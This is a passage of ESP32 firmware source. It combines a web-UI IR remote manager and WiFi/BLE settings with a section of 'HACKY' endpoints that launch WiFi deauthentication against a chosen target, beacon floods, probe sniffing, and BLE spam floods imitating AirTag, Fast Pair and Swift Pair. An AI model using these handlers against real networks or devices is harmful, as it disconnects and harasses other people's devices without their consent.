    row.innerHTML='<span style="color:var(--fg);flex:1;word-break:break-all">'+s.name+'</span><span style="color:var(--dim);margin-left:4px;white-space:nowrap">0x'+s.value+'</span><div style="display:flex;gap:3px;margin-left:4px"><button class="btn btn-sm" onclick="blastSignal('+i+')">BLAST</button><button class="btn btn-sm btn-orange" onclick="renameSignalPrompt('+i+')">RENAME</button><button class="btn btn-sm btn-red" onclick="deleteSignal('+i+')">DEL</button></div>';
    list.appendChild(row);
  });
  if(list.children.length===0)list.innerHTML='<div style="color:var(--dim);text-align:center;padding:12px;font-size:.7em">No signals saved.</div>';
}
function addSignal() {
  const name=document.getElementById('sigNameInput').value.trim()||'New Signal';
  let value=document.getElementById('sigValueInput').value.trim();
  value=value.replace('0x','').replace('0X','');
  if(!value||value==='0'){addLog('[SIGNALS] Enter a valid hex value');return;}
  signalsData.push({name:name,value:value});
  document.getElementById('sigNameInput').value='';
  document.getElementById('sigValueInput').value='';
  document.getElementById('sigLastCapture').textContent='No capture';
  saveSignals();renderSignals();
  addLog('[SIGNALS] Added: '+name+' 0x'+value);
}
function captureToSignal() {
  const v=document.getElementById('irValue').textContent;
  const p=document.getElementById('irProto').textContent;
  if(v&&v!=='--'&&v!=='0'){
    document.getElementById('sigValueInput').value=v;
    document.getElementById('sigNameInput').value=p+' 0x'+v;
    document.getElementById('sigLastCapture').textContent=p+' 0x'+v;
    addLog('[SIGNALS] Captured: '+p+' 0x'+v);
  }else{
    addLog('[SIGNALS] No signal captured yet. Use Capture Signal first.');
  }
}
function blastSignal(idx) {
  const val=signalsData[idx].value;
  fetch('/api/signals/blast?signal='+val,{method:'POST'}).then(r=>r.text()).then(t=>{addLog('[SIGNALS] Blasted: '+signalsData[idx].name);}).catch(()=>{});
}
function renameSignalPrompt(idx) {
  const newName=prompt('New name:',signalsData[idx].name);
  if(newName&&newName.trim()){signalsData[idx].name=newName.trim();saveSignals();renderSignals();}
}
function deleteSignal(idx) {
  if(confirm('Delete signal "'+signalsData[idx].name+'"?')){signalsData.splice(idx,1);saveSignals();renderSignals();}
}
// ===================== IR REMOTES (CUSTOM REMOTE MANAGER) =====================
const remotes = {};
let currentRemoteId = null;
let manageMode = false;
let remotesLoaded = false;

function loadRemotes() {
  fetch('/api/remotes/load').then(r=>r.json()).then(data=>{
    Object.keys(remotes).forEach(k=>delete remotes[k]);
    Object.keys(data).forEach(k=>{remotes[k]=data[k];});
    remotesLoaded = true;
    renderRemoteList();
    addLog('[REMOTES] Loaded ' + Object.keys(remotes).length + ' remotes');
  }).catch(()=>{
    remotesLoaded = true;
    renderRemoteList();
  });
}

function saveRemotes() {
  const payload = JSON.stringify(remotes);
  remotesJson = payload;
  fetch('/api/remotes/save', {method:'POST', body:payload}).catch(()=>{});
}

function toggleManageMode() {
  manageMode = !manageMode;
  document.getElementById('manageModeBtn').innerText = manageMode ? 'EXIT MANAGE' : 'MANAGE MODE';
  renderRemoteList();
}

function createRemotePrompt() {
  document.getElementById('remoteNameInput').value = '';
  document.getElementById('createRemoteModal').classList.remove('hidden');
}

function closeModal(id) {
  document.getElementById(id).classList.add('hidden');
}

function createRemote() {
  const name = document.getElementById('remoteNameInput').value.trim() || 'Unnamed Remote';
  const id = 'remote_' + Date.now();
  remotes[id] = {name: name, buttons: []};
  renderRemoteList();
  saveRemotes();
  closeModal('createRemoteModal');
}

function renderRemoteList() {
  const container = document.getElementById('remoteList');
  if (!container) return;
  container.innerHTML = '';
  const search = document.getElementById('remoteSearch').value.toLowerCase();
  Object.keys(remotes).forEach(id => {
    const remote = remotes[id];
    if (!remote.name.toLowerCase().includes(search)) return;
    const card = document.createElement('div');
    card.className = 'remote-card';
    let manageHtml = '';
    if (manageMode) {
      manageHtml = '<div class="remote-manage">' +
        '<button class="btn btn-sm btn-purple" onclick="event.stopPropagation();duplicateRemote(\''+id+'\')">COPY</button>' +
        '<button class="btn btn-sm btn-red" onclick="event.stopPropagation();deleteRemote(\''+id+'\')">DEL</button>' +
        '</div>';
    }
    card.innerHTML = '<div class="remote-card-name">' + remote.name + '</div>' +
      '<div class="remote-card-info">' + (remote.buttons ? remote.buttons.length : 0) + ' BUTTONS</div>' + manageHtml;
    card.onclick = () => { openRemote(id); };
    container.appendChild(card);
  });
}

function openRemote(id) {
  currentRemoteId = id;
  document.getElementById('viewerRemoteName').innerText = remotes[id].name;
  renderButtons();
  document.getElementById('remoteViewerModal').classList.remove('hidden');
}

function renderButtons() {
  const grid = document.getElementById('viewerButtons');
  grid.innerHTML = '';
  if (!remotes[currentRemoteId] || !remotes[currentRemoteId].buttons) return;
  remotes[currentRemoteId].buttons.forEach(btn => {
    const button = document.createElement('div');
    button.className = 'ir-btn';
    button.innerHTML = '<div>' + btn.name + '</div>';
    button.onclick = () => { blastButton(btn.signal); };
    button.oncontextmenu = (e) => {
      e.preventDefault();
      if (confirm('Delete button?')) {
        remotes[currentRemoteId].buttons = remotes[currentRemoteId].buttons.filter(b => b !== btn);
        renderButtons();
        renderRemoteList();
        saveRemotes();
      }
    };
    grid.appendChild(button);
  });
}

function blastButton(signal) {
  fetch('/api/remotes/blast?signal=' + encodeURIComponent(signal), {method:'POST'})
    .then(r=>r.text()).then(t=>{ addLog('[REMOTE] ' + t); })
    .catch(()=>{ addLog('[REMOTE] Blast failed'); });
}

const SIGNAL_OPTIONS = [
  {value:'Samsung Power', label:'Samsung Power (NEC 0xE0E040BF)'},
  {value:'Samsung Volume Up', label:'Samsung Volume Up (NEC 0xE0E048B7)'},
  {value:'LG AC Power', label:'LG AC Power (NEC 0x20DF10EF)'},
  {value:'Sony TV Power', label:'Sony TV Power (SONY 0x0A90)'},
  {value:'Daikin AC On', label:'Daikin AC On (NEC 0x11DA)'},
  {value:'Panasonic Power', label:'Panasonic Power (NEC 0x4004)'},
];

let selectedSignal = 'Samsung Power';

function showSignalList() {
  filterSignalList();
}

function filterSignalList() {
  const search = document.getElementById('signalSearchInput').value.toLowerCase();
  const list = document.getElementById('signalList');
  list.innerHTML = '';
  SIGNAL_OPTIONS.forEach(opt => {
    if (!opt.label.toLowerCase().includes(search) && !opt.value.toLowerCase().includes(search)) return;
    const item = document.createElement('div');
    item.style.cssText = 'padding:6px 8px;cursor:pointer;border-bottom:1px solid var(--border);font-size:.75em;color:var(--fg)';
    item.textContent = opt.label;
    item.onmouseover = () => { item.style.background = 'var(--border)'; };
    item.onmouseout = () => { item.style.background = 'transparent'; };
    item.onclick = () => {
      selectedSignal = opt.value;
      document.getElementById('signalSearchInput').value = opt.label;
      list.innerHTML = '';
      document.querySelectorAll('#signalList div').forEach(d=>d.style.background='transparent');
    };
    list.appendChild(item);
  });
  if (list.children.length === 0) {
    list.innerHTML = '<div style="padding:6px;color:var(--dim);font-size:.7em">No signals found</div>';
  }
}

function openAddButton() {
  document.getElementById('buttonNameInput').value = '';
  document.getElementById('signalSearchInput').value = '';
  selectedSignal = 'Samsung Power';
  document.getElementById('addButtonModal').classList.remove('hidden');
  setTimeout(() => { filterSignalList(); }, 100);
}

function addButtonToRemote() {
  const name = document.getElementById('buttonNameInput').value.trim() || 'BUTTON';
  const signal = selectedSignal;
  remotes[currentRemoteId].buttons.push({name: name, signal: signal});
  renderButtons();
  renderRemoteList();
  saveRemotes();
  closeModal('addButtonModal');
}

function deleteRemote(id) {
  if (confirm('Delete remote?')) {
    delete remotes[id];
    renderRemoteList();
    saveRemotes();
  }
}

function duplicateRemote(id) {
  const oldRemote = remotes[id];
  const newId = 'remote_' + Date.now();
  remotes[newId] = {
    name: oldRemote.name + ' Copy',
    buttons: JSON.parse(JSON.stringify(oldRemote.buttons))
  };
  renderRemoteList();
  saveRemotes();
}

function renameRemotePrompt() {
  document.getElementById('renameRemoteInput').value = remotes[currentRemoteId].name;
  document.getElementById('renameRemoteModal').classList.remove('hidden');
}

function renameRemote() {
  const newName = document.getElementById('renameRemoteInput').value.trim();
  if (newName) {
    remotes[currentRemoteId].name = newName;
    document.getElementById('viewerRemoteName').innerText = newName;
    renderRemoteList();
    saveRemotes();
  }
  closeModal('renameRemoteModal');
}
// ===================== END IR REMOTES =====================

document.addEventListener('DOMContentLoaded',()=>{showModule('home');loadTheme();wifiCheckSaved();renderThemes();fetchSystemStats();});
</script></body></html>
)rawliteral";

// ===================== BLE ADVERTISING =====================
void startBleAdvertising() {
    if (btAdvertising) return;
    if (!nimbleInitialized) { NimBLEDevice::init(btName.c_str()); nimbleInitialized = true; }
    pServer = NimBLEDevice::createServer();
    pService = pServer->createService("180F");
    pCharacteristic = pService->createCharacteristic("2A19", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY);
    pCharacteristic->setValue("OK"); pService->start();
    pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->addServiceUUID("180F"); pAdvertising->setAppearance(0x00);
    pAdvertising->setName(btName.c_str()); pAdvertising->enableScanResponse(true); pAdvertising->start();
    btAdvertising = true; btEnabled = true;
    addLog("[BT] Advertising started as '%s'", btName.c_str());
}

void stopBleAdvertising() {
    if (!btAdvertising && !nimbleInitialized) return;
    if (pAdvertising != nullptr) { pAdvertising->stop(); pAdvertising = nullptr; }
    pServer = nullptr; pService = nullptr; pCharacteristic = nullptr;
    NimBLEDevice::deinit();
    nimbleInitialized = false; btAdvertising = false; btEnabled = false;
    addLog("[BT] BLE stopped");
}

// ===================== API HANDLERS ========================
void handleRoot() { server.send_P(200, "text/html", index_html); }

void handleBtToggle() {
    if (server.hasArg("state")) {
        String state = server.arg("state");
        if (state == "on") { if (!btAdvertising) { startBleAdvertising(); } else { btEnabled = true; } addLog("[BT] Radio ON"); }
        else { if (btAdvertising) { btEnabled = false; server.send(200,"text/plain","OFF"); delay(300); stopBleAdvertising(); return; } else { btEnabled = false; } addLog("[BT] Radio OFF"); }
    }
    server.send(200, "text/plain", btEnabled ? "ON" : "OFF");
}

void handleBtStatus() { server.send(200, "text/plain", btEnabled ? "ON" : "OFF"); }
void handleBtScan() { server.send(200, "application/json", performBleScan()); }
void handleBtName() {
    if (server.hasArg("name")) { String n = server.arg("name"); if (n.length()>0) { saveBtName(n); btName=n; addLog("[BT] Name set: %s", n.c_str()); server.send(200,"text/plain","SAVED // BT NAME: "+n); return; } }
    server.send(200, "text/plain", btName);
}

void handleBtPair() {
    if (server.hasArg("mac")) {
        String mac = server.arg("mac"); String name = server.hasArg("name") ? server.arg("name") : "Unknown";
        addLog("[BT] Pair request: %s (%s)", name.c_str(), mac.c_str());
        String pairResult = performBlePair(mac);
        if (pairResult == "PAIRED OK") addPairedDevice(name, mac);
        server.send(200, "text/plain", pairResult); return;
    }
    server.send(400, "text/plain", "ERR: MAC required");
}

void handleBtPaired() { server.send(200, "application/json", getPairedDevicesJson()); }

void handleBtUnpair() {
    if (server.hasArg("index")) { int idx = server.arg("index").toInt();
        if (idx >= 0 && idx < pairedCount) { String mac = pairedDevices[idx].mac; if (removePairedDevice(idx)) { addLog("[BT] Unpaired index %d (%s)", idx, mac.c_str()); server.send(200, "text/plain", "UNPAIRED OK"); return; } }
        server.send(400, "text/plain", "ERR: Invalid index"); return;
    }
    server.send(400, "text/plain", "ERR: index required");
}

void handleWifiToggle() {
    if (server.hasArg("state")) { String s = server.arg("state"); if (s=="on") { wifiEnabled=true; WiFi.mode(WIFI_AP); WiFi.softAP(apSsid.c_str(),apPass.c_str()); addLog("[WiFi] Radio ON"); } else { wifiEnabled=false; server.send(200,"text/plain","OFF"); delay(500); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); addLog("[WiFi] Radio OFF"); return; } }
    server.send(200, "text/plain", wifiEnabled ? "ON" : "OFF");
}

void handleWifiScan() {
    String cs=apSsid, cp=apPass; IPAddress ip = WiFi.softAPIP();
    int n = WiFi.scanNetworks();
    WiFi.mode(WIFI_AP); WiFi.softAP(cs.c_str(),cp.c_str()); WiFi.softAPConfig(ip,ip,IPAddress(255,255,255,0));
    addLog("[WiFi] Scan: %d networks found", n);
    String json="[";
    for (int i=0;i<n;i++) {
        if(i>0)json+=","; json+="{\"ssid\":\""; String ssid=WiFi.SSID(i); for(size_t j=0;j<ssid.length();j++){char c=ssid.charAt(j);if(c=='"')json+="\\\"";else if(c=='\\')json+="\\\\";else json+=c;}
        json+="\",\"rssi\":"+String(WiFi.RSSI(i))+",\"enc\":\""; switch(WiFi.encryptionType(i)){case WIFI_AUTH_OPEN:json+="OPEN";break;case WIFI_AUTH_WEP:json+="WEP";break;case WIFI_AUTH_WPA_PSK:json+="WPA";break;case WIFI_AUTH_WPA2_PSK:json+="WPA2";break;case WIFI_AUTH_WPA_WPA2_PSK:json+="WPA/WPA2";break;case WIFI_AUTH_WPA2_ENTERPRISE:json+="WPA2-ENT";break;case WIFI_AUTH_WPA3_PSK:json+="WPA3";break;default:json+="UNKNOWN";}
        json+="\",\"bssid\":\""+WiFi.BSSIDstr(i)+"\",\"channel\":"+String(WiFi.channel(i))+"}";
    }
    json+="]"; WiFi.scanDelete(); server.send(200,"application/json",json);
}

void handleWifiConnect() {
    if(server.hasArg("ssid")){
        String ssid=server.arg("ssid"),pass=server.hasArg("pass")?server.arg("pass"):"";
        addLog("[WiFi] Connecting to %s...",ssid.c_str());
        WiFi.begin(ssid.c_str(),pass.c_str());
        int a=0;
        while(WiFi.status()!=WL_CONNECTED&&a<20){delay(500);a++;}
        if(WiFi.status()==WL_CONNECTED){
            addLog("[WiFi] Connected to %s",ssid.c_str());
            if(server.hasArg("save")&&server.arg("save")=="1"){saveStationConfig(ssid,pass);staSsid=ssid;staPass=pass;addLog("[WiFi] Saved network: %s",ssid.c_str());}
            server.send(200,"text/plain","CONNECTED // IP: "+WiFi.localIP().toString());return;
        } else {
            addLog("[WiFi] FAILED: %s",ssid.c_str());
            server.send(200,"text/plain","FAILED");return;
        }
    }
    server.send(400,"text/plain","ERR: SSID required");
}

void handleWifiConnectSaved() {
    if(staSsid.length()==0){server.send(200,"text/plain","NO SAVED NETWORK");return;}
    addLog("[WiFi] Connecting to saved: %s...",staSsid.c_str());
    WiFi.begin(staSsid.c_str(),staPass.c_str());
    int a=0;
    while(WiFi.status()!=WL_CONNECTED&&a<20){delay(500);a++;}
    if(WiFi.status()==WL_CONNECTED){
        addLog("[WiFi] Connected to saved: %s",staSsid.c_str());
        server.send(200,"text/plain","CONNECTED // IP: "+WiFi.localIP().toString());
    } else {
        addLog("[WiFi] FAILED saved: %s",staSsid.c_str());
        server.send(200,"text/plain","FAILED");
    }
}

void handleWifiSaved() { server.send(200,"text/plain",staSsid.length()>0?staSsid:""); }

void handleWifiForget() {
    addLog("[WiFi] Forgetting saved network: %s",staSsid.length()>0?staSsid.c_str():"(none)");
    forgetStationConfig(); staSsid=""; staPass="";
    server.send(200,"text/plain","FORGOTTEN");
}

void handleWifiCurrent() { server.send(200, "application/json", "{\"ssid\":\""+apSsid+"\",\"pass\":\""+apPass+"\"}"); }
void handleWifiConfig() { if(server.hasArg("ssid")){String ns=server.arg("ssid"),np=server.hasArg("pass")?server.arg("pass"):"";if(ns.length()>0){saveConfig(ns,np);apSsid=ns;apPass=np;addLog("[CFG] AP saved: %s",ns.c_str());server.send(200,"text/plain","SAVED // Next boot: "+ns);return;}}server.send(400,"text/plain","ERR: SSID required");}
void handleWifiStatus() { server.send(200, "text/plain", wifiEnabled ? "ON" : "OFF"); }

void handleTheme() {
    if(server.hasArg("idx")){int idx=server.arg("idx").toInt();if(idx>=0&&idx<MAX_THEMES){saveThemeIndex(idx);addLog("[CFG] Theme: %d",idx);server.send(200,"text/plain",String(idx));return;}}
    server.send(200,"text/plain",String(themeIndex));
}

void handleSystemReboot() { addLog("[SYS] Rebooting..."); server.send(200,"text/plain","REBOOTING"); delay(500); ESP.restart(); }
void handleSystemReset() { prefs.begin("zwisser",false); prefs.clear(); prefs.end(); addLog("[SYS] Factory reset"); server.send(200,"text/plain","RESET // REBOOTING"); delay(1000); ESP.restart(); }
void handleLog() { server.send(200, "application/json", getLogs()); }
void handleLogClear() { logIndex=0; logCount=0; server.send(200,"text/plain","OK"); }

// ===================== IR API HANDLERS =====================
void handleIrScan() {
    if (server.hasArg("state")) {
        String state = server.arg("state");
        if (state == "on") { irReading = true; irrecv.enableIRIn(); addLog("[IR] Scanner ON"); }
        else { irReading = false; irrecv.disableIRIn(); addLog("[IR] Scanner OFF"); }
    }
    server.send(200, "text/plain", irReading ? "ON" : "OFF");
}
void handleIrLast() {
    String json = "{\"protocol\":\"" + lastIrProtocol + "\",\"value\":\"" + lastIrValue + "\",\"bits\":" + String(lastIrBits) + "}";
    server.send(200, "application/json", json);
}
void handleIrSend() {
    if (server.hasArg("proto") && server.hasArg("value")) {
        String proto = server.arg("proto");
        String valStr = server.arg("value");
        if (valStr.startsWith("0x")) valStr = valStr.substring(2);
        uint64_t value = strtoull(valStr.c_str(), NULL, 16);
        int bits = server.hasArg("bits") ? server.arg("bits").toInt() : 32;
        addLog("[IR] Sending %s: 0x%s (%d bits)", proto.c_str(), valStr.c_str(), bits);
        if (proto == "NEC") {
            irsend.sendNEC(value, bits);
        } else if (proto == "SONY") {
            irsend.sendSony(value, bits);
        } else if (proto == "SAMSUNG") {
            irsend.sendSamsung36(value, bits);
        } else if (proto == "LG") {
            irsend.sendLG(value, bits);
        } else {
            irsend.sendNEC(value, bits);
        }
        server.send(200, "text/plain", "SENT // "+proto+" 0x"+valStr);
    } else {
        server.send(400, "text/plain", "ERR: proto and value required");
    }
}
void handleTvbgoneStart() { tvbgoneRunning = true; tvbgoneIndex = 0; addLog("[IR] TV-B-Gone started"); server.send(200, "text/plain", "ACTIVE"); }
void handleTvbgoneStop() { tvbgoneRunning = false; addLog("[IR] TV-B-Gone stopped"); server.send(200, "text/plain", "STOPPED"); }

// ===================== IR ENGINE API HANDLERS ==============
void handleIrState() {
    String json = "{";
    json += "\"protocol\":\"" + lastIrProtocol + "\",";
    json += "\"value\":\"" + lastIrValue + "\",";
    json += "\"bits\":" + String(lastIrBits) + ",";
    json += "\"recording\":" + String(irReadingRaw ? "true" : "false");
    json += "}";
    server.send(200, "application/json", json);
}

void handleIrRecord() {
    irReadingRaw = true;
    irReading = true;
    irRecordStart = millis();
    if (lastRawBuf) { free(lastRawBuf); lastRawBuf = nullptr; lastRawLen = 0; }
    irrecv.enableIRIn();
    addLog("[IR] Record window opened (10s)");
    server.send(200, "text/plain", "RECORDING");
}

void handleIrGree() {
    bool power = server.hasArg("power") ? server.arg("power") == "1" : true;
    uint8_t temp = server.hasArg("temp") ? (uint8_t)server.arg("temp").toInt() : 24;
    String modeStr = server.hasArg("mode") ? server.arg("mode") : "COOL";
    String fanStr = server.hasArg("fan") ? server.arg("fan") : "AUTO";
    if (temp < 16) temp = 16;
    if (temp > 30) temp = 30;
    greeAC.setPower(power);
    greeAC.setTemp(temp);
    if (modeStr == "COOL") greeAC.setMode(kGreeCool);
    else if (modeStr == "DRY") greeAC.setMode(kGreeDry);
    else if (modeStr == "FAN") greeAC.setMode(kGreeFan);
    else if (modeStr == "AUTO") greeAC.setMode(kGreeAuto);
    if (fanStr == "AUTO") greeAC.setFan(kGreeFanAuto);
    else if (fanStr == "LOW") greeAC.setFan(kGreeFanMin);
    else if (fanStr == "MED") greeAC.setFan(kGreeFanMed);
    else if (fanStr == "HIGH") greeAC.setFan(kGreeFanMax);
    greeAC.send();
    addLog("[IR] Gree AC sent: power=%d temp=%d mode=%s fan=%s", power, temp, modeStr.c_str(), fanStr.c_str());
    server.send(200, "text/plain", "GREE SENT // PWR:" + String(power) + " TMP:" + String(temp) + " MODE:" + modeStr + " FAN:" + fanStr);
}

// ===================== REMOTES API HANDLERS ================
void handleRemotesLoad() {
    File f = LittleFS.open("/remotes.json", "r");
    if (f) {
        String content = f.readString();
        f.close();
        if (content.length() == 0) content = "{}";
        server.send(200, "application/json", content);
    } else {
        server.send(200, "application/json", "{}");
    }
}

void handleRemotesSave() {
    if (server.hasArg("plain")) {
        String body = server.arg("plain");
        if (body.length() > 0 && body.length() < 65536) {
            File f = LittleFS.open("/remotes.json", "w");
            if (f) {
                f.print(body);
                f.close();
                remotesJson = body;
                addLog("[REMOTES] Saved %d bytes to /remotes.json", body.length());
                server.send(200, "text/plain", "SAVED // " + String(body.length()) + " bytes");
            } else {
                server.send(500, "text/plain", "ERR: write failed");
            }
        } else {
            server.send(400, "text/plain", "ERR: invalid payload");
        }
    } else {
        server.send(400, "text/plain", "ERR: no body");
    }
}

void handleRemotesBlast() {
    String signal = "";
    if (server.hasArg("signal")) {
        signal = server.arg("signal");
    }
    if (signal.length() == 0) {
        server.send(400, "text/plain", "ERR: signal required");
        return;
    }
    
    addLog("[REMOTES] Blasting signal: %s", signal.c_str());
    
    struct SignalMap {
        const char* name;
        uint64_t value;
        int bits;
        decode_type_t proto;
    };
    
    const SignalMap signalMap[] = {
        {"Samsung Power",      0xE0E040BF, 32, NEC},
        {"Samsung Volume Up",  0xE0E048B7, 32, NEC},
        {"LG AC Power",        0x20DF10EF, 32, NEC},
        {"Sony TV Power",      0xA90,      12, SONY},
        {"Daikin AC On",       0x11DA,     16, NEC},
        {"Panasonic Power",    0x4004,     16, NEC},
        {nullptr, 0, 0, UNKNOWN}
    };
    
    bool sent = false;
    for (int i = 0; signalMap[i].name != nullptr; i++) {
        if (signal == String(signalMap[i].name)) {
            if (signalMap[i].proto == NEC) {
                irsend.sendNEC(signalMap[i].value, signalMap[i].bits);
            } else if (signalMap[i].proto == SONY) {
                irsend.sendSony(signalMap[i].value, signalMap[i].bits);
            }
            addLog("[REMOTES] Blasted mapped code: %s (0x%llX)", signal.c_str(), signalMap[i].value);
            sent = true;
            break;
        }
    }
    
    if (!sent) {
        String hexStr = signal;
        if (hexStr.startsWith("0x") || hexStr.startsWith("0X")) hexStr = hexStr.substring(2);
        uint64_t hexVal = strtoull(hexStr.c_str(), NULL, 16);
        if (hexVal > 0) {
            irsend.sendNEC(hexVal, 32);
            addLog("[REMOTES] Blasted raw hex: 0x%s", hexStr.c_str());
            sent = true;
        }
    }
    
    if (sent) {
        server.send(200, "text/plain", "BLASTED // " + signal);
    } else {
        server.send(200, "text/plain", "UNKNOWN SIGNAL // " + signal);
    }
}

// ===================== SIGNALS LIBRARY API =================
String getSignalsJson() {
    File f = LittleFS.open("/signals.json", "r");
    if (f) {
        String content = f.readString();
        f.close();
        if (content.length() == 0) content = "[]";
        return content;
    }
    return "[]";
}
void saveSignalsJson(String body) {
    File f = LittleFS.open("/signals.json", "w");
    if (f) { f.print(body); f.close(); signalsJson = body; }
}
void handleSignalsLoad() { server.send(200, "application/json", getSignalsJson()); }
void handleSignalsSave() {
    if (server.hasArg("plain")) {
        String body = server.arg("plain");
        if (body.length() > 0 && body.length() < 65536) {
            saveSignalsJson(body);
            addLog("[SIGNALS] Saved %d bytes", body.length());
            server.send(200, "text/plain", "SAVED");
            return;
        }
    }
    server.send(400, "text/plain", "ERR");
}
void handleSignalsBlast() {
    String signal = server.hasArg("signal") ? server.arg("signal") : "";
    if (signal.length() == 0) { server.send(400, "text/plain", "ERR"); return; }
    uint64_t val = strtoull(signal.c_str(), NULL, 16);
    if (val > 0) {
        irsend.sendNEC(val, 32);
        server.send(200, "text/plain", "BLASTED");
    } else {
        server.send(200, "text/plain", "ERR");
    }
}

// ===================== HACKY API HANDLERS ==================
void handleDeauthStart() {
    if (server.hasArg("target") && server.hasArg("ap")) {
        stringToMac(server.arg("target"), deauthTarget); stringToMac(server.arg("ap"), deauthAP);
        deauthChannel = server.hasArg("ch") ? server.arg("ch").toInt() : 1; if(deauthChannel<1)deauthChannel=1; if(deauthChannel>13)deauthChannel=13;
        deauthRate = server.hasArg("rate") ? server.arg("rate").toInt() : 50; if(deauthRate<1)deauthRate=1; if(deauthRate>1000)deauthRate=1000;
        deauthReason = server.hasArg("reason") ? server.arg("reason").toInt() : 7;
        deauthAllChannels = server.hasArg("allch") ? server.arg("allch")=="1" : false;
        startDeauth(); server.send(200,"text/plain","DEAUTH ACTIVE // Ch"+String(deauthChannel)+" rate:"+String(deauthRate)+" reason:"+String(deauthReason)); return;
    }
    server.send(400,"text/plain","ERR: target and ap required");
}
void handleDeauthStop() { stopDeauth(); server.send(200,"text/plain","DEAUTH STOPPED"); }
void handleDeauthStatus() { server.send(200,"text/plain",deauthRunning?"ACTIVE":"IDLE"); }
void handleBeaconStart() {
    if (server.hasArg("prefix")||server.hasArg("random")) {
        beaconPrefix = server.hasArg("prefix") ? server.arg("prefix") : "WIFI";
        if(beaconPrefix.length()>20)beaconPrefix=beaconPrefix.substring(0,20);
        beaconCount = server.hasArg("count")?server.arg("count").toInt():8; if(beaconCount<1)beaconCount=1; if(beaconCount>MAX_BEACON_NAMES)beaconCount=MAX_BEACON_NAMES;
        deauthChannel = server.hasArg("ch")?server.arg("ch").toInt():1; if(deauthChannel<1)deauthChannel=1; if(deauthChannel>13)deauthChannel=13;
        beaconEncryption = server.hasArg("enc")?server.arg("enc"):"OPEN";
        beaconRandomSsids = server.hasArg("random")?server.arg("random")=="1":false;
        beaconIndex=0; startBeaconFlood();
        server.send(200,"text/plain","BEACON ACTIVE // "+String(beaconCount)+" APs enc:"+beaconEncryption); return;
    }
    server.send(400,"text/plain","ERR: prefix required");
}
void handleBeaconStop() { stopBeaconFlood(); server.send(200,"text/plain","BEACON STOPPED"); }
void handleProbeStart() { startProbeSniffer(); server.send(200,"text/plain","PROBE SNIFFER ACTIVE"); }
void handleProbeStop() { stopProbeSniffer(); server.send(200,"text/plain","PROBE SNIFFER STOPPED"); }
void handleProbeResults() { String j="["; for(int i=0;i<probeResultCount;i++){if(i>0)j+=",";j+=probeResults[i];} j+="]"; server.send(200,"application/json",j); }
void handleHopStart() { startChannelHopping(); server.send(200,"text/plain","HOP ACTIVE"); }
void handleHopStop() { stopChannelHopping(); server.send(200,"text/plain","HOP STOPPED"); }
void handleHopStatus() { server.send(200,"text/plain",String(currentHopChannel)); }
void handleAirtagStart() { airtagSpamRunning=true; addLog("[HACK] AirTag spam started"); server.send(200,"text/plain","AIRTAG SPAM ACTIVE"); }
void handleAirtagStop() { airtagSpamRunning=false; addLog("[HACK] AirTag spam stopped"); server.send(200,"text/plain","AIRTAG SPAM STOPPED"); }
void handleSmarttagStart() { smarttagSpamRunning=true; addLog("[HACK] SmartTag spam started"); server.send(200,"text/plain","SMARTTAG SPAM ACTIVE"); }
void handleSmarttagStop() { smarttagSpamRunning=false; addLog("[HACK] SmartTag spam stopped"); server.send(200,"text/plain","SMARTTAG SPAM STOPPED"); }
void handleSwiftpairStart() { swiftpairSpamRunning=true; addLog("[HACK] Swift Pair spam started"); server.send(200,"text/plain","SWIFT PAIR SPAM ACTIVE"); }
void handleSwiftpairStop() { swiftpairSpamRunning=false; addLog("[HACK] Swift Pair spam stopped"); server.send(200,"text/plain","SWIFT PAIR SPAM STOPPED"); }
void handleGfpStart() { googleFastPairRunning=true; addLog("[HACK] Google Fast Pair spam started"); server.send(200,"text/plain","GFP SPAM ACTIVE"); }
void handleGfpStop() { googleFastPairRunning=false; addLog("[HACK] Google Fast Pair spam stopped"); server.send(200,"text/plain","GFP SPAM STOPPED"); }
void handleIbeaconStart() { ibeaconRunning=true; addLog("[HACK] iBeacon spam started"); server.send(200,"text/plain","IBEACON SPAM ACTIVE"); }
void handleIbeaconStop() { ibeaconRunning=false; addLog("[HACK] iBeacon spam stopped"); server.send(200,"text/plain","IBEACON SPAM STOPPED"); }
void handleEddystoneStart() { eddystoneRunning=true; addLog("[HACK] Eddystone spam started"); server.send(200,"text/plain","EDDYSTONE SPAM ACTIVE"); }
void handleEddystoneStop() { eddystoneRunning=false; addLog("[HACK] Eddystone spam stopped"); server.send(200,"text/plain","EDDYSTONE SPAM STOPPED"); }
void handleBleSpamStart() { bleSpamRunning=true; addLog("[HACK] BLE Pair flood started"); server.send(200,"text/plain","BLE SPAM ACTIVE"); }
void handleBleSpamStop() { bleSpamRunning=false; addLog("[HACK] BLE Pair flood stopped"); server.send(200,"text/plain","BLE SPAM STOPPED"); }
void handleNameRandOn() { bleNameRandomizerRunning=true; addLog("[HACK] Name randomizer ON"); server.send(200,"text/plain","NAME RAND ON"); }
void handleNameRandOff() { bleNameRandomizerRunning=false; addLog("[HACK] Name randomizer OFF"); server.send(200,"text/plain","NAME RAND OFF"); }
void handleStopAllBleSpam() {
    airtagSpamRunning=false; smarttagSpamRunning=false; swiftpairSpamRunning=false;
    googleFastPairRunning=false; ibeaconRunning=false; eddystoneRunning=false; bleSpamRunning=false;
    addLog("[HACK] All BLE spam stopped");
    server.send(200,"text/plain","ALL BLE SPAM STOPPED");
}

// ===================== SETUP ===============================
void setup() {
    Serial.begin(115200); delay(500);
    loadConfig(); loadPairedDevices();
    if (!LittleFS.begin(true)) {
        addLog("[SYS] LittleFS mount failed!");
    } else {
        addLog("[SYS] LittleFS mounted");
        File f = LittleFS.open("/remotes.json", "r");
        if (f) {
            remotesJson = f.readString();
            f.close();
            addLog("[SYS] Remotes loaded (%d bytes)", remotesJson.length());
        } else {
            remotesJson = "{}";
            addLog("[SYS] No remotes file, initialized empty");
        }
    }
    addLog("[SYS] Booting..."); addLog("[BT] %d paired devices loaded", pairedCount);
    addLog("[CFG] AP SSID: %s | Theme: %d", apSsid.c_str(), themeIndex);

    // Initialize OLED display first (I2C)
    initOLED();

    // Initialize button GPIOs with internal pull-up
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_CENTER, INPUT_PULLUP);
    addLog("[SYS] Buttons initialized: UP=G%d DOWN=G%d LEFT=G%d RIGHT=G%d CENTER=G%d",
